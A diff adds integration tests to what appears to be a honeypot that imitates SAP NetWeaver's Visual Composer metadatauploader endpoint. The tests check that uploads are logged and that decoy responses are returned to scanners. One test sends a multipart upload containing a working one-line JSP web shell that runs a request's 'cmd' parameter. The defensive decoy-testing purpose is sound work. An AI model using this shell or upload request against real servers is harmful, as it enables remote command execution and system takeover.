@@ -152,6 +152,77 @@ async def test_integration_file_upload_get_jquery_filer_readme(live_server, monk
     assert matches[0]["fileUploadHasPhpShell"] is False
 
 
+async def test_integration_sap_metadatauploader_post_upload(live_server, monkeypatch):
+    """POST a multipart body containing a JSP shell payload against the
+    Visual Composer servlet. The handler should parse filename + JSP-shell
+    indicator out of the body, log `sap-metadatauploader-upload` with those
+    fields, and return the plaintext "OK: stored …" receipt with the uploaded
+    filename echoed back (the success marker scanners parse to know which
+    follow-on URL to GET for shell execution)."""
+    monkeypatch.setattr(tbenv, "SAP_METADATAUPLOADER_ENABLED", True)
+    base, log_path = live_server
+    boundary = "----WebKitFormBoundarySAPNW7"
+    body = (
+        f"--{boundary}\r\n"
+        'Content-Disposition: form-data; name="file"; filename="helper.jsp"\r\n'
+        "Content-Type: application/octet-stream\r\n"
+        "\r\n"
+        "<%@ page import=\"java.io.*\" %>\r\n"
+        "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\r\n"
+        f"--{boundary}--\r\n"
+    ).encode("utf-8")
+    async with aiohttp.ClientSession() as session:
+        async with session.post(
+            f"{base}/developmentserver/metadatauploader",
+            headers={
+                "X-Forwarded-For": "203.0.113.50",
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+            },
+            data=body,
+        ) as resp:
+            assert resp.status == 200
+            assert resp.headers["Content-Type"].startswith("text/plain")
+            response_body = await resp.read()
+            assert response_body.startswith(b"OK: stored ")
+            assert b"helper.jsp" in response_body
+            # Banner is what makes scanners commit to the next request.
+            assert resp.headers.get("Server", "").startswith("SAP NetWeaver")
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    matches = [e for e in entries if e.get("result") == "sap-metadatauploader-upload"]
+    assert len(matches) == 1, entries
+    entry = matches[0]
+    assert entry["sapMetadataUploaderPath"] == "/developmentserver/metadatauploader"
+    assert entry["sapMetadataUploaderMethod"] == "POST"
+    assert entry["sapMetadataUploaderHasMultipart"] is True
+    assert entry["sapMetadataUploaderFilenames"] == ["helper.jsp"]
+    assert entry["sapMetadataUploaderHasJspShell"] is True
+
+
+async def test_integration_sap_metadatauploader_get_returns_sap_error(live_server, monkeypatch):
+    """Bare GET to the Visual Composer servlet returns the SAP-formatted
+    error envelope real NetWeaver emits and logs `sap-metadatauploader-probe`."""
+    monkeypatch.setattr(tbenv, "SAP_METADATAUPLOADER_ENABLED", True)
+    base, log_path = live_server
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            f"{base}/developmentserver/metadatauploader",
+            headers={"X-Forwarded-For": "203.0.113.51"},
+        ) as resp:
+            assert resp.status == 200
+            assert resp.headers["Content-Type"].startswith("application/xml")
+            body = await resp.read()
+            assert b"<?xml" in body
+            assert b"METADATA_UPLOAD_NO_REQUEST" in body
+            assert b"sap:Error" in body
+
+    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
+    matches = [e for e in entries if e.get("result") == "sap-metadatauploader-probe"]
+    assert len(matches) == 1
+    assert matches[0]["sapMetadataUploaderMethod"] == "GET"
+    assert matches[0]["sapMetadataUploaderHasJspShell"] is False
+
+
 async def test_integration_boto_canary_serves_aws_creds(live_server):
     """The new `.boto` canary trap returns an INI body with the canary AWS
     keys in both `[Credentials]` and `[profile prod]` sections."""
